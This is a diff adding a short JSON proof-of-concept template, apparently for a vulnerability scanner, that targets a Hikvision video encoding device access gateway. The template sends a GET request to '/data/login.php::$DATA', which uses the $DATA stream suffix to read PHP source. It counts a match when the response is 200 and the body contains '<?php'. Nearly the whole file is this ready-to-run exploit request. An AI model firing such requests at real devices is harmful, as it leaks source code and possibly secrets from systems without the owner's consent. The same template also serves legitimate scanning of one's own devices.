@@ -1,0 +1,19 @@
+{
+  "poc": "HIKVISION视频编码设备接入网关$DATA任意文件源码读取",
+  "req":[
+    {
+      "method": "GET",
+      "uri": "/data/login.php::$DATA",
+      "headers":{
+        "user-agent": "5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36",
+        "content-type": "application/x-www-form-urlencoded"
+      },
+      "data": "",
+      "check":{
+        "status": 200,
+        "header_words": [],
+        "body_words": ["<?php"]
+      }
+    }
+  ]
+}
